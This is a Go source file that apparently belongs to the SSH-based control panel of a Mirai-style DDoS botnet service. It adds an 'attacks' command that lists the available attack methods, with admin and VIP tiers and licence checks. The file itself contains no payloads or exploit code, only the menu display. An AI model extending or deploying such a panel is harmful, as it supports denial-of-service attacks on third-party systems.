package commands

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/alexeyco/simpletable"
	"golang.org/x/crypto/ssh"

	"Yami/core/models/Json"
	"Yami/core/clients/branding"
	Sessions "Yami/core/clients/session"
	livewire "Yami/core/models/dlcs/Live_Wire"
	License "Yami/core/models/license"
)

// branding reload command
func init() {
	Register(&Command{
		Name: "attacks",
		Admin: false,
		Reseller: false,

		Descriptions: "Lists all registered attack methods!",
		Execute: func(channel ssh.Channel, sshConn *ssh.ServerConn, Session *Sessions.Session, cmd []string) error {
			if len(cmd) < 2 {
				AttackMenuList(channel, sshConn)
				return nil
			}

			switch cmd[1] {

			case "search":
			}

			return nil
		},
	})
}
func AttackMenuList(channel ssh.Channel, conn *ssh.ServerConn) {

	table := simpletable.New()

	if License.LiveWire {
		if !JsonParse.LiveWireDLCSync.TableGradient.Status {
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Name"},
					{Align: simpletable.AlignCenter, Text: "Description"},
					{Align: simpletable.AlignCenter, Text: "Admin Method"},
					{Align: simpletable.AlignCenter, Text: "VIP Method"},
					{Align: simpletable.AlignCenter, Text: "Type"},
				},
			}
		} else {
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Name"},
					{Align: simpletable.AlignCenter, Text: "Description"},
					{Align: simpletable.AlignCenter, Text: "Admin Method"},
					{Align: simpletable.AlignCenter, Text: "VIP Method"},
					{Align: simpletable.AlignCenter, Text: "Type"},
				},
			}
		}
	}


	if License.LiveWire {
		if !JsonParse.LiveWireDLCSync.TableGradient.Status {
			for i := 0; i < len(JsonParse.AttackSyncs.Attacks); i++ {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
					{Text: JsonParse.AttackSyncs.Attacks[i].Name},
					{Text: JsonParse.AttackSyncs.Attacks[i].Description},
					{Text: Branding.ColourizeBoolen(JsonParse.AttackSyncs.Attacks[i].AdminMethod)},
					{Text: Branding.ColourizeBoolen(JsonParse.AttackSyncs.Attacks[i].VipMethod)},
					{Text: "API"},
				}
				
				table.Body.Cells = append(table.Body.Cells, r)
			}
		} else {
			for i := 0; i < len(JsonParse.AttackSyncs.Attacks); i++ {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
					{Text: JsonParse.AttackSyncs.Attacks[i].Name},
					{Text: JsonParse.AttackSyncs.Attacks[i].Description},
					{Text: strconv.FormatBool(JsonParse.AttackSyncs.Attacks[i].AdminMethod)},
					{Text: strconv.FormatBool(JsonParse.AttackSyncs.Attacks[i].VipMethod)},
					{Text: "API"},
				}
				
				table.Body.Cells = append(table.Body.Cells, r)
			}
		}
	}

	if License.LiveWire {
		if !JsonParse.LiveWireDLCSync.TableGradient.Status {
			for i := 0; i < len(JsonParse.SlaveSync.Slaves); i++ {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
					{Text: JsonParse.SlaveSync.Slaves[i].Name},
					{Text: JsonParse.SlaveSync.Slaves[i].Description},
					{Text: Branding.ColourizeBoolen(JsonParse.SlaveSync.Slaves[i].Admin)},
					{Text: Branding.ColourizeBoolen(JsonParse.SlaveSync.Slaves[i].Vip)},
					{Text: "MIRAI"},
				}
				
				table.Body.Cells = append(table.Body.Cells, r)
			}
		} else {
			for i := 0; i < len(JsonParse.SlaveSync.Slaves); i++ {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
					{Text: JsonParse.SlaveSync.Slaves[i].Name},
					{Text: JsonParse.SlaveSync.Slaves[i].Description},
					{Text: strconv.FormatBool(JsonParse.SlaveSync.Slaves[i].Admin)},
					{Text: strconv.FormatBool(JsonParse.SlaveSync.Slaves[i].Vip)},
					{Text: "MIRAI"},
				}
				
				table.Body.Cells = append(table.Body.Cells, r)
			}
		}
	} else {
		for i := 0; i < len(JsonParse.SlaveSync.Slaves); i++ {
			r := []*simpletable.Cell{
				{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
				{Text: JsonParse.SlaveSync.Slaves[i].Name},
				{Text: JsonParse.SlaveSync.Slaves[i].Description},
				{Text: Branding.ColourizeBoolen(JsonParse.SlaveSync.Slaves[i].Admin)},
				{Text: Branding.ColourizeBoolen(JsonParse.SlaveSync.Slaves[i].Vip)},
				{Text: "MIRAI"},
			}
			
			table.Body.Cells = append(table.Body.Cells, r)
		}
	}


	if len(table.Body.Cells) > 0 {

		if License.LiveWire {
			if JsonParse.LiveWireDLCSync.TableGradient.Status {
				table.SetStyle(simpletable.StyleCompact)
				fmt.Fprint(channel, "")
				livewire.Fade(strings.ReplaceAll(table.String(), "\n", "\r\n"), channel)
				fmt.Fprintln(channel, "\r")
				return
			}
		}
		table.SetStyle(simpletable.StyleCompact)
		fmt.Fprint(channel, "")
		fmt.Fprintln(channel, strings.ReplaceAll(table.String(), "\n", "\r\n"))
		fmt.Fprint(channel, "\r")

	}
	return
}